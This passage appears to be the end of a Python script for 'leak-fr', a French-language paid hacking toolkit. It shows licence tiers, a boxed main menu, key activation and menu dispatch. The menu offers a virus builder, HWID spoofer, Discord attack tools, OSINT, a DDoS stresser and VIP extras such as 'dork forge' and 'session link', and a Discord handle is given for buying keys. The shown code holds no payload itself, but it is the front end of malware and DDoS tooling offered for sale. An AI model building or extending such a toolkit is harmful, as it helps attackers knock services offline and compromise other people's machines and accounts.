  {Y}VIP Life{RST}       : {W}panel VIP + MAJ serveur a vie{RST}
  {PLUS_COL}VIP+{RST}           : {W}VIP + 5 outils exclusifs (dork forge, friend graph, session link...){RST}
  {AMI_COL}AMI{RST}            : {W}tout + branding custom + vault perso + relay owner + presets{RST}
  {Y}Owner{RST}          : {W}tout + gestion des cles{RST}

  {DIM}Tape 1337 au menu principal si tu es owner.{RST}
""")
    pause()


# ========================================================================
# MAIN MENU
# ========================================================================
MAIN_CATEGORIES = [
    ("MALWARE BUILD", CAT_MALWARE, CAT_MALWARE_DARK, [
        ("01", "Virus Builder"),
        ("02", "HWID Spoofer"),
        ("03", "Discord Tools"),
        ("04", "VC Discord Tools"),
    ]),
    ("SCAN", CAT_SCAN, CAT_SCAN_DARK, [
        ("10", "Network Scanner"),
        ("11", "Web Tools"),
        ("12", "OSINT"),
    ]),
    ("PANEL & TOOLS", CAT_PANEL, CAT_PANEL_DARK, [
        ("20", "VIP Panel"),
        ("25", "VIP+ Panel"),
        ("26", "AMI Panel"),
        ("21", "Roblox Tools"),
        ("22", "Crypto Tools"),
        ("23", "Phone / SMS"),
        ("24", "Utilities"),
    ]),
    ("NETWORK / ATTACK", CAT_NETWORK, CAT_NETWORK_DARK, [
        ("30", "DDoS Stresser"),
        ("40", "Info & Contact"),
    ]),
]


def _box_group(title, cb, cd, items, col_w=26):
    fill = max(0, col_w - len(title) - 4)
    head = f"{cd}┌─ {BOLD_ANSI}{cb}{title}{RESET_ANSI}{cd} " + ("─" * fill) + f"┐{RESET_ANSI}"
    foot = f"{cd}└" + ("─" * col_w) + f"┘{RESET_ANSI}"
    lines = [head]
    for k, label in items:
        item = f"{cb}[{k}]{RESET_ANSI} {W}{label}{RESET_ANSI}"
        vis = 4 + 1 + len(label)
        filln = max(0, col_w - vis - 1)
        lines.append(f"{cd}│{RESET_ANSI} {item}" + (" " * filln) + f"{cd}│{RESET_ANSI}")
    while len(lines) < 10:
        lines.append(f"{cd}│{RESET_ANSI}" + (" " * col_w) + f"{cd}│{RESET_ANSI}")
    lines.append(foot)
    return lines


def leakfr_main_menu():
    leakfr_banner()
    W_ = _term_w()
    boxes = [_box_group(t, c, cd, items) for t, c, cd, items in MAIN_CATEGORIES]
    max_h = max(len(b) for b in boxes)
    for b in boxes:
        while len(b) < max_h: b.append(" " * 28)
    total_w = 4 * 28 + 3 * 2
    left_pad = max(0, (W_ - total_w) // 2)
    print()
    for i in range(max_h):
        print(" " * left_pad + "  ".join(_pad(b[i], 28) for b in boxes))

    tier_col = { "free": DIM, "vip": BLOOD_BRIGHT, "vip+": PLUS_COL, "ami": AMI_COL, "owner": GOLD }.get(_TIER, DIM)
    hint = f"tier: {_TIER}  ·  0 = exit  ·  1337 = owner"
    pad_hint = max(0, (W_ - len(hint)) // 2)
    print(f"\n{' ' * pad_hint}{BLOOD_MID}»{RESET_ANSI} "
          f"{tier_col}tier: {_TIER}{RESET_ANSI}  "
          f"{GHOST}·  0 = exit  ·  1337 = owner{RESET_ANSI}")

    contact = "Discord moumou0718 pour obtenir une key"
    pad_c = max(0, (W_ - len(contact) - 4) // 2)
    print(f"{' ' * pad_c}{BLOOD_DARK}──[ {RESET_ANSI}"
          f"{BOLD_ANSI}{BLOOD_BRIGHT}{contact}{RESET_ANSI}"
          f"{BLOOD_DARK} ]──{RESET_ANSI}")


def main():
    ok, msg = _is_activated()
    if not ok:
        activation_screen()
        ok, msg = _is_activated()
        if not ok:
            print(f"  {R}[X]{RST} {msg}"); sys.exit(1)

    _loader_steps(f"leak-fr v{VERSION}", [
        "chargement des modules reseau",
        "initialisation du panneau discord",
        "montage du hwid spoofer",
        f"licence {_TIER} validee",
    ])

    while True:
        leakfr_main_menu()
        W_ = _term_w()
        pp = max(0, (W_ - 40) // 2)
        c = input(" " * pp + f"{BLOOD_BRIGHT}leak-fr >{RESET_ANSI} ").strip().lower()

        if c == _OWNER_TRIG:
            owner_menu(); continue
        if c in ("0", "exit", "quit"):
            clr()
            print(f"\n  {BLOOD_LIGHT}leak-fr{RESET_ANSI} "
                  f"{GHOST}· by 31300-leak-fr · a bientot.{RESET_ANSI}\n")
            sys.exit(0)
        elif c in ("01", "1"): builder_menu()
        elif c in ("02", "2"): hwid_menu()
        elif c in ("03", "3"): discord_menu()
        elif c in ("04", "4"): vc_menu()
        elif c == "10": net_menu()
        elif c == "11": web_menu()
        elif c == "12": osint_menu()
        elif c == "20": vip_menu()
        elif c == "25": vipx_menu()
        elif c == "26": ami_menu()
        elif c == "21": roblox_menu()
        elif c == "22": crypto_menu()
        elif c == "23": phone_menu()
        elif c == "24": util_menu()
        elif c == "30": ddos_menu()
        elif c in ("40", "99"): info_contact_screen()
        else:
            print(f"  {BLOOD_MID}[leak-fr]{RESET_ANSI} option inconnue.")
            time.sleep(0.6)


# ========================================================================
# ENTRY
# ========================================================================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.stdout.write(RESET_ANSI + "\n")
        print(f"\n  {BLOOD_LIGHT}leak-fr{RESET_ANSI} "
              f"{GHOST}· interrupted{RESET_ANSI}\n")
        sys.exit(0)
